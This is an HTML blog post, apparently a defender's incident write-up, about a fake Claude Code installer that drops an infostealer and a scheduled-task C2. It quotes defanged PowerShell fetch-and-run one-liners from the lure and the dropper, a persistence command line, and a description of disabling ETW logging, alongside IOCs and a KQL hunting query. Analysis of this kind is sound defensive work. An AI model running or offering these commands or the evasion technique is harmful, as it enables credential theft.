@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fake Claude Code Installer → Infostealer & C2 | gx0s</title>
+  <meta name="description" content="A counterfeit Claude Code installer that mirrors the real one but splices in a dropper, deploying an infostealer and a scheduled-task HTTP C2.">
+
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2321ba45' d='M12 1 3 5v6c0 5 3.8 9.7 9 11 5.2-1.3 9-6 9-11V5z'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.css">
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.js"></script>
+
+  <style>
+    body { background: #f4f6f8; }
+    .article.container { margin: 6em auto 4em; width: 90vw !important; max-width: 1600px !important; }
+    .article.container p { font-size: 1.1em; line-height: 1.7; text-align: justify; }
+    pre { background:#1b1c1d; color:#9cffb3; padding:1em; border-radius:6px; overflow-x:auto; font-size:0.9em; white-space:pre-wrap; word-break:break-all; }
+    figure { margin: 1.5em 0; }
+    figure img { width:100%; border:1px solid #d4d4d5; border-radius:6px; }
+    figure.blend img { border:none; }
+    figure.narrow { max-width:720px; margin-left:auto; margin-right:auto; }
+    figcaption { color:#888; font-size:0.9em; margin-top:0.5em; text-align:center; }
+    code { background:#eee; padding:0.1em 0.4em; border-radius:3px; }
+    .footer.segment { padding: 0.5em 0; background: #fff; color: rgba(0,0,0,0.87); font-size: 0.9em; }
+    .footer.segment a { color: #4183c4; }
+    .ui.inverted.menu a.item:not(.header):hover { background: #21ba45; color: #fff; }
+    /* Left contents menu */
+    .toc { display:none; }
+    .toc .toc-title { font-weight:700; text-transform:uppercase; font-size:0.75em; letter-spacing:.05em; color:#999; padding:0 0 .5em .6em; }
+    .toc a { display:block; padding:.32em .6em; color:#555; border-left:2px solid transparent; text-decoration:none; font-size:.88em; line-height:1.3; }
+    .toc a:hover { color:#21ba45; background:#eef1f3; }
+    .toc a.active { color:#21ba45; border-left-color:#21ba45; font-weight:600; }
+    .article.container h2.ui.header { scroll-margin-top: 72px; }
+    @media (min-width:1200px){
+      .toc { display:block; position:fixed; top:4.8em; left:14px; width:225px; max-height:82vh; overflow-y:auto; padding:.4em .2em; }
+      .article.container { margin: 6em 0 4em 265px !important; width:auto !important; max-width:1150px !important; }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- ===== Navigation ===== -->
+  <div class="ui fixed inverted menu">
+    <div class="ui container">
+      <a href="index.html" class="header item">
+        <i class="shield alternate icon"></i>
+        gx0s
+      </a>
+      <a href="index.html" class="item">Home</a>
+      <a href="index.html#profile" class="item">About</a>
+    </div>
+  </div>
+
+  <!-- ===== Article ===== -->
+  <nav class="toc" id="toc"><div class="toc-title">On this page</div></nav>
+
+  <div class="ui article container">
+
+    <a href="index.html" class="ui basic button">
+      <i class="left arrow icon"></i> Back to all cases
+    </a>
+
+    <div class="ui hidden divider"></div>
+
+    <div class="ui label violet"><i class="user secret icon"></i> Infostealer</div>
+    <span style="color:#888; margin-left:1em;"><i class="calendar icon"></i> 2026-05-13 &middot; 10 min read</span>
+
+    <h1 class="ui header" style="margin-top:0.5em;">The Fake Claude Code Installer That Steals Everything</h1>
+
+    <p><em>Summary: A user trying to install Claude Code was lured to a fraudulent site and ran
+    its one-line PowerShell command. The script was a near-perfect copy of Anthropic's real
+    installer — it even installs a genuine, working <code>claude.exe</code> — but two lines were
+    spliced in to pull a dropper. What followed was a full infostealer (browser passwords,
+    passkeys, Wi-Fi/RDP/credential-vault, clipboard, screenshots) plus a scheduled-task HTTP C2,
+    all while disabling PowerShell logging and running entirely in memory.</em></p>
+
+    <figure class="blend">
+      <img src="images/claude/timeline.png" alt="Fake Claude attack-chain timeline">
+      <figcaption>Attack chain — lure site → legit-looking install → spliced dropper → in-memory evasion → credential harvest → scheduled-task C2.</figcaption>
+    </figure>
+
+    <h2 class="ui header"><i class="bullseye icon"></i> What caught my eye</h2>
+    <p>This one is nasty precisely because it works. The victim gets a real, functioning Claude
+    Code install and sees nothing wrong — so there's no reason to report anything. The only tell
+    was on the back end: a PowerShell process quietly reaching out to a domain that had no
+    business being in an installer.</p>
+
+    <h2 class="ui header"><i class="hand pointer icon"></i> The lure</h2>
+    <p>The user was redirected to a site impersonating the Claude Code installer landing page and
+    ran the command it displayed:</p>
+    <pre>irm hxxps://use-code[.]com/install.ps1 | iex</pre>
+
+    <h2 class="ui header"><i class="copy icon"></i> The downloader — hiding in a real installer</h2>
+    <p>The script is a near-perfect clone of Anthropic's legitimate Claude Code Windows installer:
+    it downloads the real <code>claude.exe</code> from the authentic Google Cloud Storage bucket,
+    verifies its genuine SHA-256, and runs the real install. The user ends up with a working
+    Claude Code — raising no suspicion. The catch: two extra lines spliced in at lines 28–29.</p>
+
+    <figure>
+      <img src="images/claude/install-script.png" alt="Fake install script with spliced lines">
+      <figcaption>The cloned installer — lines 28–29 (highlighted) use <code>Shell.Application</code> to launch a hidden <code>irm api.bio9438[.]com | iex</code>.</figcaption>
+    </figure>
+
+    <p>That hidden second stage fetched an obfuscated downloader from <code>api.bio9438[.]com</code>,
+    which reduced to a small script that runs two further PowerShell payloads in parallel.</p>
+
+    <div class="ui two column stackable grid">
+      <div class="column">
+        <figure>
+          <img src="images/claude/downloader-obf.jpg" alt="Obfuscated downloader">
+          <figcaption>The obfuscated downloader.</figcaption>
+        </figure>
+      </div>
+      <div class="column">
+        <figure>
+          <img src="images/claude/downloader-deobf.jpg" alt="Deobfuscated downloader">
+          <figcaption>Deobfuscated — a runspace pool firing <code>reshow35[.]com</code> and <code>celsius.proper829[.]com</code> payloads in parallel.</figcaption>
+        </figure>
+      </div>
+    </div>
+
+    <h2 class="ui header"><i class="eye slash icon"></i> Evasion — blinding the defender</h2>
+    <p>The first payload disables PowerShell's detection plumbing and uses reflective, in-memory
+    loading so nothing touches disk. It reaches into <code>PSEtwLogProvider</code> — the component
+    that forwards PowerShell script blocks to Defender — and flips its <code>m_enabled</code> field
+    to <code>0</code>, significantly blinding detection.</p>
+
+    <figure>
+      <img src="images/claude/etw.png" alt="Disabling PSEtwLogProvider">
+      <figcaption>Reflection used to disable <code>PSEtwLogProvider</code> ETW logging.</figcaption>
+    </figure>
+
+    <h2 class="ui header"><i class="key icon"></i> The harvest — an infostealer at work</h2>
+    <p>With logging blinded, the stealer loaded the .NET assemblies it needed:
+    <code>System.Security</code> to decrypt browser-stored passwords and passkeys,
+    <code>System.Windows.Forms</code> for clipboard access, and <code>System.Drawing</code> for
+    screenshots. It then harvested the full credential vault — Wi-Fi, RDP, and every
+    <code>CredWrite</code>-stored application credential — base64-encoding each for exfiltration.</p>
+
+    <p>Defender surfaced the credential and clipboard theft:</p>
+    <table class="ui celled striped table">
+      <thead><tr><th>EDR event</th><th>Detail</th><th>Technique</th></tr></thead>
+      <tbody>
+        <tr><td><code>powershell.exe</code> attempted to decrypt credentials</td><td>Microsoft Edge — <code>UnprotectData</code> (DPAPI); flagged "Suspicious DPAPI Activity" (High)</td><td>T1555.003, T1555.004</td></tr>
+        <tr><td><code>svchost.exe</code> read clipboard data</td><td>via API call <code>CClipDataObject::GetData</code></td><td>T1115</td></tr>
+      </tbody>
+    </table>
+
+    <figure>
+      <img src="images/claude/browsers.png" alt="Hardcoded browser targets">
+      <figcaption>Hardcoded browser targets — Chrome, Brave, and Edge user-data and binary paths.</figcaption>
+    </figure>
+
+    <p>Before infecting, the malware checks the host's locale and <strong>skips Russian-speaking
+    regions and Iran</strong> — a common "don't hit home" guardrail.</p>
+
+    <figure>
+      <img src="images/claude/regions.png" alt="Region exclusion list">
+      <figcaption>The <code>Test-IsExcludedRegion</code> allow-list — Russia, Iran and CIS locales are spared.</figcaption>
+    </figure>
+
+    <p>It fingerprints the host (username + <code>MachineGuid</code> from the registry) and reports
+    to its C2, identified by a campaign GUID.</p>
+
+    <table class="ui celled striped table">
+      <thead><tr><th>Time (2026-05-13)</th><th>EDR event</th><th>Technique</th></tr></thead>
+      <tbody>
+        <tr><td>13:41:53</td><td><code>powershell.exe</code> created process <code>whoami.exe</code></td><td>—</td></tr>
+        <tr><td>13:41:53</td><td><code>powershell.exe</code> performed system owner/user discovery by invoking <code>whoami</code></td><td>T1033</td></tr>
+      </tbody>
+    </table>
+
+    <figure>
+      <img src="images/claude/c2.png" alt="C2 base URL and campaign ID">
+      <figcaption>C2 base URL <code>olive3451[.]com</code> with a per-campaign identifier.</figcaption>
+    </figure>
+
+    <h2 class="ui header"><i class="sync icon"></i> Persistence &amp; C2</h2>
+    <p>The persistence and C2 modules were registered as a <strong>scheduled task</strong> so the
+    malware survives reboots. The C2 module spins up a local HTTP listener that takes JSON commands
+    to inject/patch running processes or execute code — all confined to <code>localhost</code> and
+    fronted by compromised websites.</p>
+
+    <table class="ui celled striped table">
+      <thead><tr><th>EDR event</th><th>Command line</th><th>Technique</th></tr></thead>
+      <tbody>
+        <tr><td>Headless PowerShell launched by scheduled task</td><td><code>conhost.exe --headless powershell -ep bypass -file C:\ProgramData\onedrive-sync.ps1</code></td><td>T1053.005</td></tr>
+      </tbody>
+    </table>
+
+    <div class="ui two column stackable grid">
+      <div class="column">
+        <figure>
+          <img src="images/claude/persistence-obf.png" alt="Obfuscated persistence module">
+          <figcaption>The heavily obfuscated persistence/C2 module.</figcaption>
+        </figure>
+      </div>
+      <div class="column">
+        <figure>
+          <img src="images/claude/listener.png" alt="HTTP listener for C2">
+          <figcaption>The local C2 — an <code>HttpListener</code> on <code>127.0.0.1:58172</code>.</figcaption>
+        </figure>
+      </div>
+    </div>
+
+    <p>A full <strong><a href="https://www.joesandbox.com/joereverser/analysis/download/3b6f3f62-f88e-49c3-b0b2-74feab8a8dd7?type=html" target="_blank" rel="noopener">Joe Sandbox</a></strong> analysis confirmed the capability set:</p>
+
+    <figure class="narrow">
+      <img src="images/claude/joe-capability.jpg" alt="Joe Sandbox capability diagram">
+      <figcaption>Joe Sandbox capability overview — obfuscation/evasion layer, local HTTP C2, process injection &amp; memory patching.</figcaption>
+    </figure>
+
+    <figure class="narrow">
+      <img src="images/claude/joe-report.jpg" alt="Joe Sandbox full analysis report">
+      <figcaption>Full analysis of <code>onedrive-sync.ps1</code> — architecture, C2 JSON protocol, execution flow, and anti-detection techniques.</figcaption>
+    </figure>
+
+    <p style="text-align:center;">
+      <a class="ui violet button" href="https://www.joesandbox.com/joereverser/analysis/download/3b6f3f62-f88e-49c3-b0b2-74feab8a8dd7?type=html" target="_blank" rel="noopener">
+        <i class="external alternate icon"></i> View the full Joe Sandbox report
+      </a>
+    </p>
+
+    <h2 class="ui header"><i class="search icon"></i> Network investigation</h2>
+    <p>Hunting the IOCs across the estate confirmed the blast radius was a single host — no other
+    systems talked to the malicious infrastructure. The outbound connections to the IOC domains:</p>
+
+    <table class="ui celled striped table">
+      <thead><tr><th>Initiating process</th><th>Remote URL</th></tr></thead>
+      <tbody>
+        <tr><td><code>msedge.exe</code></td><td><code>use-code[.]com</code></td></tr>
+        <tr><td><code>powershell.exe</code></td><td><code>olive3451[.]com</code></td></tr>
+        <tr><td><code>powershell.exe</code></td><td><code>reshow35[.]com</code></td></tr>
+        <tr><td><code>powershell.exe</code></td><td><code>api.bio9438[.]com</code></td></tr>
+      </tbody>
+    </table>
+
+    <p>The Advanced Hunting (KQL) query used to scope the IOCs across endpoints:</p>
+    <pre>let back = 30d;
+let iocRoots = dynamic(["proper829.com","show35.com","reshow35.com",
+                        "olive3451.com","bio9438.com","use-code.com"]);
+DeviceProcessEvents
+| where Timestamp > ago(back)
+| where ProcessCommandLine has_any (iocRoots)
+   or InitiatingProcessCommandLine has_any (iocRoots)
+| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
+          InitiatingProcessFileName, InitiatingProcessCommandLine
+| sort by Timestamp desc</pre>
+
+    <h2 class="ui header"><i class="crosshairs icon"></i> MITRE ATT&amp;CK Techniques Used</h2>
+    <table class="ui violet celled striped table">
+      <thead><tr><th>Tactic</th><th>Technique</th></tr></thead>
+      <tbody>
+        <tr><td>Initial Access / Execution</td><td>T1204.004 — User Execution: Malicious Copy and Paste</td></tr>
+        <tr><td>Execution</td><td>T1059.001 — Command and Scripting Interpreter: PowerShell</td></tr>
+        <tr><td>Defense Evasion</td><td>T1027 — Obfuscated Files or Information</td></tr>
+        <tr><td>Defense Evasion</td><td>T1562.006 — Impair Defenses: Indicator Blocking (disable ETW)</td></tr>
+        <tr><td>Defense Evasion</td><td>T1620 — Reflective Code Loading (in-memory)</td></tr>
+        <tr><td>Defense Evasion</td><td>T1564.003 — Hide Artifacts: Hidden Window</td></tr>
+        <tr><td>Credential Access</td><td>T1555.003 — Credentials from Web Browsers</td></tr>
+        <tr><td>Credential Access</td><td>T1555.004 — Credentials from Password Stores: Windows Credential Manager</td></tr>
+        <tr><td>Collection</td><td>T1115 — Clipboard Data</td></tr>
+        <tr><td>Collection</td><td>T1113 — Screen Capture</td></tr>
+        <tr><td>Discovery</td><td>T1033 — System Owner/User Discovery</td></tr>
+        <tr><td>Discovery</td><td>T1614 — System Location Discovery (region check)</td></tr>
+        <tr><td>Persistence</td><td>T1053.005 — Scheduled Task</td></tr>
+        <tr><td>Command and Control</td><td>T1071.001 — Application Layer Protocol: Web Protocols</td></tr>
+        <tr><td>Command and Control</td><td>T1105 — Ingress Tool Transfer</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="ui header"><i class="list icon"></i> Indicators of Compromise (IOCs)</h2>
+    <table class="ui red celled striped table">
+      <thead><tr><th>Type</th><th>Indicator</th></tr></thead>
+      <tbody>
+        <tr><td>Lure / installer domain</td><td><code>use-code[.]com</code> (<code>install.ps1</code>)</td></tr>
+        <tr><td>Dropper domain</td><td><code>api.bio9438[.]com</code></td></tr>
+        <tr><td>Payload / C2 domains</td><td><code>celsius.proper829[.]com</code>, <code>show35[.]com</code>, <code>reshow35[.]com</code>, <code>olive3451[.]com</code></td></tr>
+        <tr><td>Local C2 listener</td><td><code>http://127.0.0.1:58172/</code> (JSON over HTTP)</td></tr>
+        <tr><td>Persistence</td><td>Scheduled task running <code>C:\ProgramData\onedrive-sync.ps1</code></td></tr>
+        <tr><td>SHA-256</td><td><code>248be398f9d3a57ec0f5884b836b5cd0f3c6c261eb868a9eb4974949e7e2643a</code></td></tr>
+      </tbody>
+    </table>
+
+  </div>
+
+  <!-- ===== Footer ===== -->
+  <div class="ui vertical footer segment">
+    <div class="ui center aligned container">
+      <p>&copy; 2026 gx0s &middot; <a href="index.html">Home</a></p>
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      var toc = document.getElementById('toc');
+      if(!toc) return;
+      var heads = document.querySelectorAll('.article.container h2.ui.header');
+      var links = [];
+      heads.forEach(function(h,i){
+        if(!h.id){ h.id = 'sec-'+i; }
+        var a = document.createElement('a');
+        a.href = '#'+h.id;
+        a.textContent = h.textContent.trim();
+        toc.appendChild(a);
+        links.push(a);
+      });
+      function onScroll(){
+        var pos = window.pageYOffset + 100, cur = null;
+        heads.forEach(function(h){ if(h.offsetTop <= pos) cur = h.id; });
+        links.forEach(function(a){ a.classList.toggle('active', a.getAttribute('href') === '#'+cur); });
+      }
+      window.addEventListener('scroll', onScroll); onScroll();
+    })();
+  </script>
+
+</body>
+
+</html>
